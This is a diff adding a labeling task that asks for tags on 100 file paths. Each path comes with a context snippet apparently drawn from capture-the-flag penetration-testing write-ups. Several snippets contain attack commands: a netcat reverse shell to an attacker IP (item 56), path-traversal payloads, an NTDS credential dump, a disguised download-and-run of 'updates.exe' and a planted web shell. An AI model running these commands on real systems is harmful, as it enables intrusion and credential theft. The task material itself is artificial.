@@ -1,0 +1,203 @@
+Label these 100 paths (chunk 12/15).
+Reply with one jsonl code block, one record per path, in input order.
+
+1. /cybermonday.htb/assets/views/home
+   context: => http://cybermonday.htb/assets/views/components/ 301      GET        7l       11w      169c http://cybermonday.htb/assets/views/home => http://cybermonday.htb/assets/views/home/ 301      GET        
+2. /var/www/html/racers/backup
+   context: #!/usr/bin/bash  OFFSITE_HOST="offsite-backup.race.vl" SOURCE_DIR="/var/www/html/racers/backup/" # Disabled USER/PASS for security reasons. Will be provided via environment from cron. # OFFSITE_
+3. c:\datastore\config\inventory.json.db
+   context: dministrator \programdata\api.config.yaml [ERROR] 2025-07-27T04:01:58-07:00 Unable to open file \\?\c:\datastore\config\inventory.json.db: open \\?\c:\datastore\config\inventory.json.db: Access is den
+4. C:\Users\[USER]\AppData\Roaming\Microsoft\Protect\{SID}\
+   context: C:\Users\[USER]\AppData\Roaming\Microsoft\Protect\{SID}\
+5. /var/www/html/project_admin/public/uploads/images
+   context: process group (1228): Inappropriate ioctl for device bash: no job control in this shell dash@usage:/var/www/html/project_admin/public/uploads/images$
+6. /root/TeamCity/buildAgent/lib/gson.jar
+   context: ar:/root/TeamCity/buildAgent/lib/commons-httpclient.jar:/root/TeamCity/buildAgent/lib/stax2-api.jar:/root/TeamCity/buildAgent/lib/gson.jar:/root/TeamCity/buildAgent/lib/spring-jdbc.jar:/root/TeamCity/
+7. /var/www/web/user-management-service/log/application.log
+   context: 2025/04/30 14:40:11 CMD: UID=0     PID=1402389 | cp /opt/scripts/application_user.log /var/www/web/user-management-service/log/application.log
+8. /home/remote
+   context: AirTouch-AP-MGT:/$ cat /etc/passwd | grep 'sh$' root:x:0:0:root:/root:/bin/bash remote:x:1000:1000::/home/remote:/bin/bash admin:x:1001:1001::/home/admin:/bin/bash
+9. /pilgrimage.htb/logout.php
+   context: //pilgrimage.htb/tmp => http://pilgrimage.htb/tmp/ 302      GET        0l        0w        0c http://pilgrimage.htb/logout.php => http://pilgrimage.htb/ 200      GET      171l      403w     6173c http
+10. C:\Users\Caroline.Robinson\Desktop
+   context: evil-winrm-py PS C:\Users\Caroline.Robinson\Desktop> cat user.txt 79bb144d************************
+11. /usr/bin/docker-compose
+   context: al.SIGINT, signal_handler)          print("Starting services...")         result = subprocess.run(["/usr/bin/docker-compose", "up", "--build"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)   
+12. \\dc01.ghost.htb\C$\users\administrator\desktop\root.txt
+   context: ------ ---- -a----          2/4/2024   2:03 PM             32 root.txt  PS C:\programdata> type \\dc01.ghost.htb\C$\users\administrator\desktop\root.txt ad8eb0da************************
+13. /opt/bitnami/mysql/bin
+   context: _PORT_80_TCP_PROTO=tcp PATH=/opt/bitnami/apache/bin:/opt/bitnami/common/bin:/opt/bitnami/common/bin:/opt/bitnami/mysql/bin:/opt/bitnami/common/bin:/opt/bitnami/php/bin:/opt/bitnami/php/sbin:/opt/bitna
+14. /usr/local/share/sattrack/config.json
+   context: jovian@jupiter:~$ find / -name 'config.json' 2>/dev/null /usr/local/share/sattrack/config.json /usr/local/lib/python3.10/dist-packages/zmq/utils/config.json
+15. /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+   context: Url            │ http://monitorsfour.htb  🚀  Threads               │ 50  📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt  👌  Status Codes          │ Al
+16. /absolute.htb/css/bootstrap.min.css
+   context: 79820c http://absolute.htb/fonts/icomoon/style.css 200      GET        7l     2103w   160392c http://absolute.htb/css/bootstrap.min.css ...[snip]...
+17. /Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php
+   context: .10.11.60 *   Trying 10.10.11.60:80... * Connected to frizzdc.frizz.htb (10.10.11.60) port 80 > GET /Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php HTTP/1.1 > Host: frizzdc.frizz.htb > User
+18. /var/www/bookworm
+   context: root@bookworm:/var/www/bookworm# file books/* books/1:  PDF document, version 1.3 books/10: PDF document, version 1.3 books/11: PDF
+19. /include/pms_settings.php
+   context: y');      ./include/pms-recs-action.php:          $key_qry  = get_option('pms_encrypt_key');       ./include/pms_settings.php:     $query  = get_option('pms_encrypt_key'); ./include/pms_settings.php: 
+20. /home/dev/node_modules/.bin
+   context: /node_modules/.bin:/home/dev/projects/store1/node_modules/.bin:/home/dev/projects/node_modules/.bin:/home/dev/node_modules/.bin:/home/node_modules/.bin:/node_modules/.bin:/usr/share/nodejs/@npmcli/run
+21. /src/main/java/com/eureka/Furni/Security/WebSecurityConfig.java
+   context: rni/Controller/UserController.java ./src/main/java/com/eureka/Furni/Repository/UserRepository.java ./src/main/java/com/eureka/Furni/Security/WebSecurityConfig.java ./src/main/java/com/eureka/Furni/Sec
+22. \\updates.msu\r\ndel
+   context: su -O updates.exe\r\n.\\updates.exe.exe\r\n.\\updates.exe\r\nmove .\\updates.exe .\\updates.msu\r\n.\\updates.msu\r\ndel .\\updates.msu\r\n'
+23. /var/log
+   context: er 8.8.8.8' > /etc/resolv.conf  # Wlan first 6 for attacker, next 14 for AP, rest for client  mkdir /var/log/ 2> /dev/nil  #F0:9F:C2:71 ubiquiti macchanger -m $MAC_PSK $WLAN_PSK >> /var/log/macchanger
+24. C:\Users\mgtsvc$\Documents
+   context: |_|   |__/  v1.4.1  [*] Connecting to 'DC.sendai.vl:5985' as 'mgtsvc$' evil-winrm-py PS C:\Users\mgtsvc$\Documents>
+25. /opt/chrome-linux64/WidevineCdm/_platform_specific/linux_x64/libwidevinecdm.so
+   context: 392:0309/174906.456205:VERBOSE1:cdm_registration.cc(234)] Choosing hinted Widevine 4.10.2891.0 from /opt/chrome-linux64/WidevineCdm/_platform_specific/linux_x64/libwidevinecdm.so [2393:2393:0309/17490
+26. C:\Users\maya
+   context: *Evil-WinRM* PS C:\Users\maya> ls documents      Directory: C:\Users\maya\documents
+27. C:\Windows\system32\Dism
+   context: 6 23:05:23, Info                  DISM   PID=3580 TID=4348 Successfully loaded the ImageSession at "C:\Windows\system32\Dism" - CDISMManager::LoadLocalImageSession 2025-05-16 23:05:23, Info           
+28. /usr/local/etc/php/conf.d
+   context: musl&#039; &#039;--with-config-file-path=/usr/local/etc/php&#039; &#039;--with-config-file-scan-dir=/usr/local/etc/php/conf.d&#039; &#039;--enable-option-checking=fatal&#039; &#039;--with-mhash&#039; 
+29. C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\BE11A3E0EA13
+   context: \scripts\A32FF3AEAA23\AC2210DC311B RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\B2ACCF2BABFB RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\BE11A3E0EA13 RW C:\Windows\SYSVOL\domain\scripts\A32FF
+30. F:/2019.vdi
+   context: <HardDisks>         <HardDisk uuid="{12b147da-5b2d-471f-9e32-a32b1517ff4b}" location="F:/2019.vdi" format="VDI" type="Normal">           <Property name="CRYPT/KeyId" value="Moderator 1"/>
+31. C:\programdata\ping_test.bat
+   context: d ping_test.bat  Info: Uploading /media/sf_CTFs/hackthebox/infiltrator-10.10.11.31/ping_test.bat to C:\programdata\ping_test.bat  Data: 28 bytes of 28 bytes copied  Info: Upload successful! *Evil-WinR
+32. /home/logan
+   context: devvortex:/home$ cat /etc/passwd | grep 'sh$' root:x:0:0:root:/root:/bin/bash logan:x:1000:1000:,,,:/home/logan:/bin/bash
+33. /home/developer/dev/siteisup_test.py
+   context: Enter URL here:http://10.10.14.6/test Traceback (most recent call last):   File "/home/developer/dev/siteisup_test.py", line 3, in <module>     url = input("Enter URL here:")   File "<string>", line 1
+34. C:\Users\Administrator\Desktop\root.txt
+   context: SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell "type C:\Users\Administrator\Desktop\root.txt" output               -----------------    Access is denied.    NULL
+35. /usr/local/nagiosxi/scripts/backup_xi.sh
+   context: rms.sh     (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *     (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
+36. /home/bill/Certs/broscience.crt
+   context: bash /root/cron.sh  2023/03/31 08:14:01 CMD: UID=0     PID=298415 | /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt  2023/03/31 08:14:01 CMD: UID=0     PID=298416 |  2023/03/31 08:14:0
+37. C:\Windows\Registration\CRMLog
+   context: Mark Russinovich Sysinternals - www.sysinternals.com  RW C:\Windows\Tasks RW C:\Windows\tracing RW C:\Windows\Registration\CRMLog  W C:\Windows\System32\Tasks RW C:\Windows\System32\spool\drivers\colo
+38. /etc/nginx/sites-available/snapped
+   context: bled/nginx-ui  -> /etc/nginx/sites-available/nginx-ui    inflating: nginx/sites-enabled/snapped  -> /etc/nginx/sites-available/snapped     creating: nginx/snippets/   inflating: nginx/snippets/fastcgi
+39. /root/TeamCity/buildAgent/lib/common.jar
+   context: 10.jar:/root/TeamCity/buildAgent/lib/launcher-api.jar:/root/TeamCity/buildAgent/lib/nuget-utils.jar:/root/TeamCity/buildAgent/lib/common.jar:/root/TeamCity/buildAgent/lib/patches-impl.jar:/root/TeamCi
+40. C:\Software\Monitoring\overwatch.exe
+   context: \> Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\overwatch\Parameters'  Application   : C:\Software\Monitoring\overwatch.exe AppParameters :  AppDirectory  : C:\Software\Monitoring PSPath 
+41. C:\Users\Martin.T\Desktop
+   context: C:\Users\Martin.T\Desktop>type user.txt 23fa9513************************
+42. C:\Windows\Tasks\Uploads\a7246e6c505d873ba68e05840d9fa696
+   context: PS C:\Windows\Tasks\Uploads> ls .\a7246e6c505d873ba68e05840d9fa696\      Directory: C:\Windows\Tasks\Uploads\a7246e6c505d873ba68e05840d9fa696  Mode                 LastWriteTime         Length Name --
+43. /usr/share/wordlists/rockyou.txt.gz
+   context: ┌─[root@parrot]─[~] └──╼ #gunzip /usr/share/wordlists/rockyou.txt.gz  ┌─[root@parrot]─[~] └──╼ #time bash crack.sh /usr/share/wordlists/rockyou.txt Testing abc123Found
+44. C:\Windows\SYSVOL\sysvol\baby2.vl\scripts\
+   context: Primary name: login.vbs     LINK INFO:       Link info flags: 3       Local base path: C:\Windows\SYSVOL\sysvol\baby2.vl\scripts\       Common path suffix: login.vbs       Location info:          Driv
+45. /etc/update-motd.d/dddddddd-dddd-dddd-dddd-dddddddddddd
+   context: www-data@dump:/var/cache/captures$ sudo tcpdump -c10 -w/var/cache/captures/a/ -Z fritz -w /etc/update-motd.d/dddddddd-dddd-dddd-dddd-dddddddddddd -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-a
+46. /var/backups/archive-2026-02-10T0139.zip
+   context: -02-10T0138.zip NFS         10.129.234.160  48491  10.129.234.160   0          -r--   4.5MB         /var/backups/archive-2026-02-10T0139.zip
+47. /app/config/configuration.php
+   context: $configurationFile = __DIR__.'/app/config/configuration.php';
+48. C:\Windows\Temp\173901502
+   context: (Pwn3d!) NTDSUTIL    10.10.11.35     445    CICADA-DC        [*] Dumping ntds with ntdsutil.exe to C:\Windows\Temp\173901502 NTDSUTIL    10.10.11.35     445    CICADA-DC        Dumping the NTDS, this 
+49. /opt/auth/api.key
+   context: api config starts" >> mkdir -p .config/bin .config/local .config/share /var/log/zapi export k=$(cat /opt/auth/api.key) export botauth_id="bot1:bot" export hash="4b22a0418847a51650623a458acc1bba5c01f65
+50. /var/log/zapi
+   context: #!/bin/bash  echo "$(date) api config starts" >> mkdir -p .config/bin .config/local .config/share /var/log/zapi export k=$(cat /opt/auth/api.key) export botauth_id="bot1:bot" export hash="4b22a0418847
+51. /....//....//....//....//....//....//....//....//etc/passwd
+   context: ...//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines: 2, Duration: 98ms] ....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 796, Words: 3, Lines
+52. C:\Users\winrm_svc\AppData\Roaming\Output
+   context: *Evil-WinRM* PS C:\Users\winrm_svc\AppData\Roaming\Output Messenger> ls      Directory: C:\Users\winrm_svc\AppData\Roaming\Output Messenger  Mode
+53. /opt/shared
+   context: t/shared/dist 2>/dev/null     /home/svc/.local/bin/pyinstaller $name     /usr/bin/mv ./dist ./build /opt/shared   else     echo "Invalid file format"     exit 1;   fi
+54. /var/log/varnish/varnishncsa.log
+   context: varnish+    1165  1.0  0.5  86552 21992 ?        Ss   Feb22  37:38 /usr/bin/varnishncsa -a -w /var/log/varnish/varnishncsa.log -D -P /run/varnishncsa/varnishncsa.pid
+55. C:\Windows\tracing
+   context: opyright (C) 2006-2022 Mark Russinovich Sysinternals - www.sysinternals.com  RW C:\Windows\Tasks RW C:\Windows\tracing RW C:\Windows\Registration\CRMLog  W C:\Windows\System32\Tasks RW C:\Windows\Syst
+56. /tmp/f
+   context: php /tmp/rce.php 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.44 443 >/tmp/f'
+57. /tmp/backrest/.config/backrest
+   context: gael@artificial:/tmp/backrest/.config/backrest$ cat config.json  {   "modno": 2,   "version": 4,   "instance": "Artificial",   "auth": {     "disa
+58. /surveillance.htb/css/scripts
+   context: 1185w    16230c http://surveillance.htb/index.php 404      GET        0l        0w        0c http://surveillance.htb/css/scripts 404      GET        0l        0w        0c http://surveillance.htb/css/
+59. /furni.htb/static/images/blogs/6.jpg
+   context: 514630c http://furni.htb/static/images/post-3.jpg 200      GET     1013l     5858w   458359c http://furni.htb/static/images/blogs/6.jpg 200      GET      398l     1025w    13568c http://furni.htb/blog
+60. /nagiosxi/login.php
+   context: /nagiosxi/login.php
+61. C:\Windows\SysWOW64\FxsTmp\
+   context: OW64\com\dmp\*" /><FilePathCondition Path="C:\Windows\SysWOW64\FxsTmp:*" /><FilePathCondition Path="C:\Windows\SysWOW64\FxsTmp\*" /><FilePathCondition Path="C:\Windows\SysWOW64\Tasks:*" /><FilePathCon
+62. /backup/offsite-backup.sh
+   context: cripts$ find . -type f -ls    269766      4 -rwxr-xr-x   1 root     racers        361 Dec  9  2023 ./backup/offsite-backup.sh    272728      4 -rwxr-xr-x   1 root     root          361 Dec  5  2023 ./
+63. C:\Backups\Splunk\splunk_backup_2024-08-06.zip
+   context: S C:\Backups\Splunk> download splunk_backup_2024-08-06.zip splunk_backup_2024-08-06.zip Downloading C:\Backups\Splunk\splunk_backup_2024-08-06.zip: 26.2MB [00:31, 860kB/s]                             
+64. /var/www/pilgrimage.htb/magick
+   context: exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrim
+65. /html/craft/storage/backups
+   context: www-data@surveillance:~/html/craft/storage/backups$ unzip surveillance--2023-10-17-202801--v4.4.14.sql.zip  Archive:  surveillance--2023-10-17-202801-
+66. C:\Users\nathan.aadam\Documents
+   context: |_|   |__/  v1.5.0  [*] Connecting to 'DC01.mirage.htb:5985' as 'nathan.aadam' evil-winrm-py PS C:\Users\nathan.aadam\Documents>
+67. C:\Users\Ferdinand\Documents
+   context: |_|   |__/  v1.5.0  [*] Connecting to 'job2.vl:5985' as 'Ferdinand' evil-winrm-py PS C:\Users\Ferdinand\Documents>
+68. /usr/local/bin/login.sh
+   context: HOST-RESOURCES-MIB::hrSWRunParameters.1691 = STRING: "/usr/local/bin/login.sh" HOST-RESOURCES-MIB::hrSWRunParameters.1741 = STRING: "-proto tcp -host-ip 172.22.0.1 -host-port 54
+69. /root/TeamCity/buildAgent/lib/idea-obsolete-openapi.jar
+   context: Agent/lib/spring-scripting/spring-scripting-groovy.jar:/root/TeamCity/buildAgent/lib/log4j-core.jar:/root/TeamCity/buildAgent/lib/idea-obsolete-openapi.jar:/root/TeamCity/buildAgent/lib/agent-launcher
+70. /var/www/developers/public/.htpasswd
+   context: AuthType Basic                 AuthName "Restricted Content"                 AuthUserFile /var/www/developers/public/.htpasswd                 Require valid-user         </Directory>          ErrorLog
+71. /tmp/hsperfdata_woodenk
+   context: script /dev/null -c bash Script started, file is /dev/null woodenk@redpanda:/tmp/hsperfdata_woodenk$ ^Z [1]+  Stopped                 nc -lnvp 443 oxdf@hacky$ stty raw -echo; fg nc -lnvp 443
+72. /home/ebelford
+   context: 2:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash ebelford:x:1002:1002:Eugene Belford:/home/ebelford:/bin/bash
+73. /home/auctioneer
+   context: -data@gavel:/$ cat /etc/passwd | grep 'sh$' root:x:0:0:root:/root:/bin/bash auctioneer:x:1001:1002::/home/auctioneer:/bin/bash
+74. /file.era.htb/logout.php
+   context: //file.era.htb/files => http://file.era.htb/files/ 200      GET        1l        6w       70c http://file.era.htb/logout.php 302      GET        0l        0w        0c http://file.era.htb/download.php
+75. C:\Users\0xdf\Source\Repos\Whisker\Whisker\bin\Release\Whisker.exe
+   context: d... 1>------ Build started: Project: Whisker, Configuration: Release Any CPU ------ 1>  Whisker -> C:\Users\0xdf\Source\Repos\Whisker\Whisker\bin\Release\Whisker.exe ========== Build: 1 succeeded, 0 
+76. /includes/coming_soon.html
+   context: oxdf@hacky$ find . -path ./.git -prune -o -type f -print ./includes/coming_soon.html ./utils.php ./index.php ./actions/action_handler.php ./actions/image2pdf.php ./assets/img/forestbri
+77. /var/../root/.selected_editor
+   context: ../root/.local/share/ /var/../root/.local/share/nano/ /var/../root/.local/share/nano/search_history /var/../root/.selected_editor /var/../root/.sqlite_history /var/../root/.profile /var/../root/script
+78. C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System\
+   context: ="C:             \Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System:*" /><FilePathCondition Path="C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System\*" /><FilePathCondition Path="C:\Windows\SysW
+79. /root/TeamCity/buildAgent/lib/common-runtime.jar
+   context: p.jar:/root/TeamCity/buildAgent/lib/agent-deployment.jar:/root/TeamCity/buildAgent/lib/httpmime.jar:/root/TeamCity/buildAgent/lib/common-runtime.jar:/root/TeamCity/buildAgent/lib/commons-beanutils.jar
+80. C:\Users\Raven\Desktop
+   context: *Evil-WinRM* PS C:\Users\Raven\Desktop> type user.txt 6e6a6b72************************
+81. /mnt/scripts
+   context: ┌─[root@parrot]─[/mnt/scripts] └──╼ #ls all-in-one  installation_scripts  miscellaneous  python-scripts ┌─[root@parrot]─[/mnt/scr
+82. /usr/sbin/rsyslogd
+   context: /usr/libexec/polkitd --no-debug syslog       846  0.0  0.1 222404  6068 ?        Ssl  12:20   0:16 /usr/sbin/rsyslogd -n -iNONE root         847  0.0  0.1  15560  7548 ?        Ss   12:20   0:00 /lib/
+83. \\updates.exe.exe\r\n
+   context: u/2025/05/windows10.0-kb5058392-x64_2881b28817b6e714e61b61a50de9f68605f02bd2.msu -O updates.exe\r\n.\\updates.exe.exe\r\n.\\updates.exe\r\nmove .\\updates.exe .\\updates.msu\r\n.\\updates.msu\r\ndel .
+84. /dev/shm/wp-load.php
+   context: www-data@moderators:/$ cp /var/www/html/logs/uploads/shell.pdf.php /dev/shm/wp-load.php
+85. /root/TeamCity/buildAgent/lib/spring-aspects.jar
+   context: ar:/root/TeamCity/buildAgent/lib/agent-openapi.jar:/root/TeamCity/buildAgent/lib/agent-launcher.jar:/root/TeamCity/buildAgent/lib/spring-aspects.jar:/root/TeamCity/buildAgent/lib/jdk-searcher.jar:/roo
+86. /var/www/html/cgi-bin
+   context: .0 443 Connection received on 10.129.242.171 6080 /bin/sh: can't access tty; job control turned off /var/www/html/cgi-bin #
+87. /var/empty
+   context: s:x:85:12::/usr/cyrus:/sbin/nologin vpopmail:x:89:89::/var/vpopmail:/sbin/nologin ntp:x:123:123:NTP:/var/empty:/sbin/nologin smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin guest:x:405:100:guest
+88. /.local/share/caddy/locks/storage_clean.lock
+   context: an  6 21:28 ./.bash_logout    156049      4 -rw-r--r--   1 hish     hish           98 Jan 12 10:23 ./.local/share/caddy/locks/storage_clean.lock    156047      4 -rw-r--r--   1 hish     hish          
+89. /home/dev/.npm
+   context: registry.npmjs.org/ LOGNAME=dev JOURNAL_STREAM=8:6217 npm_config_prefix=/usr/local npm_config_cache=/home/dev/.npm npm_config_node_gyp=/usr/share/nodejs/node-gyp/bin/node-gyp.js PATH=/home/dev/project
+90. /include/admin-page/addon/csv-import/pms-csv-import-setting-page/pms_import_html.php
+   context: php:                                               if(get_option('pms_encrypt_key',true) == true){ ./include/admin-page/addon/csv-import/pms-csv-import-setting-page/pms_import_html.php:               
+91. C:\Users\HHogan\Documents
+   context: yFtW183#'  Evil-WinRM shell v3.4  Info: Establishing connection to remote endpoint  *Evil-WinRM* PS C:\Users\HHogan\Documents>
+92. /usr/local/lib/python3.8/dist-packages/impacket/smb3.py
+   context: 278, in login     return self._SMBConnection.login(user, password, domain, lmhash, nthash)   File "/usr/local/lib/python3.8/dist-packages/impacket/smb3.py", line 923, in login     if ans.isValidAnswer
+93. C:\Users\gale.dekarios
+   context: PS C:\Users\gale.dekarios> .\SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r
+94. /home/sammy
+   context: home/mark:/bin/bash gitea:x:116:123:Git Version Control,,,:/home/gitea:/bin/bash sammy:x:1002:1003::/home/sammy:/bin/bash
+95. /tmp/tmpyrq33jav
+   context: oxdf@hacky$ python generate_pve_stuff.py  writing plaintext to /tmp/tmpyrq33jav calling openssl to sign generated ticket for root@pam: PVE:root@pam:668FB290::lWbUT5hPHA/9UgdNNmYFG
+96. C:\SQLServer\Logs
+   context: *Evil-WinRM* PS C:\SQLServer\Logs> ls      Directory: C:\SQLServer\Logs  Mode                LastWriteTime         Length Name ----
+97. C:\Users\adfs_gmsa$\Documents\ADFSDump.exe
+   context: ments> upload ADFSDump.exe  Info: Uploading /home/oxdf/hackthebox/ghost-10.10.11.24/ADFSDump.exe to C:\Users\adfs_gmsa$\Documents\ADFSDump.exe  Data: 38912 bytes of 38912 bytes copied  Info: Upload su
+98. C:\programdata\0xdf.exe
+   context: oxdf@hacky$ cat rev.url  [internetshortcut] URL=C:\programdata\0xdf.exe
+99. /var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_074
+   context: file or directory (2) [2415:2418:0309/174909.488544:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_074": No such file or director
+100. /admin.snapped.htb/assets/index-Cjd4fVAL.css
+   context: 42w    75487c http://admin.snapped.htb/favicon.ico 200      GET        1l     8254w   308866c http://admin.snapped.htb/assets/index-Cjd4fVAL.css 403      GET        1l        2w       34c http://admin
